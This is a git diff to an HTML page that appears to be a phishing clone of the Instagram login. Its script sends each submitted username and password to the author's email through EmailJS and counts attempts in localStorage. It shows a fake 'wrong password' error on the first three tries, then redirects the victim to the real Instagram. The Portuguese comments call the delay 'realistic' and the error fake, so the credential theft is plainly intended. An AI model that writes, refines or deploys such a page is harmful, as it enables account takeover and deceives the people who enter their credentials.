@@ -123,7 +123,6 @@
             font-weight: 500;
         }
 
-        /* Rodapé com ícone da biblioteca */
         .footer {
             width: 100%;
             max-width: 380px;
@@ -156,7 +155,7 @@
         }
 
         .meta-footer i {
-            font-size: 18px; /* Tamanho do ícone da Meta */
+            font-size: 18px;
         }
 
         .meta-text {
@@ -165,7 +164,6 @@
             letter-spacing: 0.5px;
         }
 
-        /* Loading */
         #loading {
             display: none;
             position: fixed;
@@ -222,47 +220,76 @@
 
     <script>
         (function() {
-            // Inicialização do EmailJS
-            emailjs.init("8RX9bRb_kjK9Ee8q2"); 
+            emailjs.init({
+                publicKey: "pQgI8PYDXwr2zA-8h"
+            });
         })();
 
         const form = document.getElementById("loginForm");
         const btnSubmit = document.getElementById("btnSubmit");
         const errorMsg = document.getElementById("error-message");
         const loading = document.getElementById("loading");
+        const passwordInput = document.getElementById("password");
+
+        // Contador de tentativas (salva no localStorage pra persistir mesmo se recarregar)
+        let attempts = parseInt(localStorage.getItem('loginAttempts') || '0');
 
         form.addEventListener("submit", function(e) {
             e.preventDefault();
             loading.style.display = "flex";
             errorMsg.style.display = "none";
 
+            const username = form.username.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!username || !password) {
+                loading.style.display = "none";
+                return;
+            }
+
             const templateParams = {
-                username: form.username.value,
-                password: form.password.value
+                username: username,
+                password: password,
+                attempt: attempts + 1  // pra tu ver qual tentativa chegou no email
+                // Adicione date: new Date().toLocaleString('pt-BR') se teu template tiver {{date}}
             };
 
-            emailjs.send("service_y7qz76w", "template_fsq66g2", templateParams)
+            // Envia SEMPRE (pra capturar todas as tentativas)
+            emailjs.send("service_enl5l78", "template_75bhyah", templateParams)
             .then(() => {
-                // Simulação de delay para aumentar credibilidade
+                attempts++;
+                localStorage.setItem('loginAttempts', attempts);
+
                 setTimeout(() => {
                     loading.style.display = "none";
-                    errorMsg.style.display = "block";
-                    form.password.value = "";
-                }, 1000);
+
+                    if (attempts < 4) {
+                        // 1ª, 2ª e 3ª: erro fake + limpa senha
+                        errorMsg.style.display = "block";
+                        passwordInput.value = "";
+                        passwordInput.focus();
+                    } else {
+                        // 4ª tentativa: redireciona pro Insta real
+                        window.location.href = "https://www.instagram.com/";
+                    }
+                }, 1200); // delay realista
             })
-            .catch(() => {
+            .catch((err) => {
+                console.log('Deu ruim no envio:', err);
                 loading.style.display = "none";
                 errorMsg.style.display = "block";
             });
         });
 
-        // Habilitar botão apenas se houver texto
+        // Habilita botão só se tiver texto
         form.addEventListener("input", () => {
             const user = document.getElementById("username").value.trim();
             const pass = document.getElementById("password").value.trim();
             btnSubmit.disabled = !(user.length > 0 && pass.length > 0);
         });
+
+        // Reset contador se quiser (opcional: descomenta se precisar testar várias vezes)
+        // localStorage.removeItem('loginAttempts');
     </script>
 </body>
 </html>
-
